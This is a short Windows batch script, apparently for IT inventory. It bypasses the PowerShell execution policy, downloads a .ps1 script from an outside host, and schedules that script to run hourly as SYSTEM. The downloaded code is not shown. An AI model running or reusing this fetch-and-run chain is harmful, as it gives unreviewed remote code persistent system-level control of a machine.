@echo off

powershell -c Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force 
powershell Get-ExecutionPolicy

powershell -c "Invoke-WebRequest -Uri 'https://konek.parasat.tv:53000/computer_detail/script_win10.ps1' -OutFile 'C:/script_win10.ps1'"

schtasks /CREATE /SC DAILY /RL highest /RU system /TN "computer_detail" /TR "powershell -ExecutionPolicy Bypass C:/script_win10.ps1" /ST 09:00 /RI 60 /DU 24:00

pause